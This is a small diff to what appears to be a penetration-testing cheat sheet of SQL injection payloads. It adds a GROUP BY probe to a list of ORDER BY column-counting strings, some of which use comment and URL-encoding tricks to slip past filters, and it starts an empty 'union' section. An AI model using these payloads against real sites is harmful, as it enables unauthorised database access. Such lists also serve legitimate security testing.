@@ -146,6 +146,7 @@ https://pentest-tools.com/website-vulnerability-scanning/sql-injection-scanner-o
 >next order by
 ```
 ORDER BY 9
+GROUP BY 9
 order by 9
 ORDER BY 1,2,3,4,5,6,7,8,9
 /*!50000ORDER*/ 9
@@ -160,7 +161,8 @@ ORDER BY 1,2,3,4,5,6,7,8,9
 +ORDER+BY+100+ASC
 %2f**%2fORDER%2f**%2fBY%2f**%2f100
 ```
-
+>next union
+```
 
 
 
